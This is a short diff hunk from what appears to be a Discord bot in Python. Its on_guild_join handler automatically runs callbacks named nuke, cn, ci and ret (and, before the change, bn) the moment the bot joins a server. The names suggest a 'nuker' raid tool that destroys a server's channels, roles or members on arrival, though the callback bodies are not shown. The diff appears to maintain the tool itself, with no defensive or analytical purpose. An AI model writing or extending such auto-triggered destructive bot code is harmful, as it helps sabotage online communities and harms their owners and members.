@@ -180,7 +180,6 @@ async def on_guild_join(guild):
         await nuke.callback(ctx)
         await cn.callback(ctx)
         await ci.callback(ctx)
-        await bn.callback(ctx)
         await ret.callback(ctx)
 
 @bot.command()
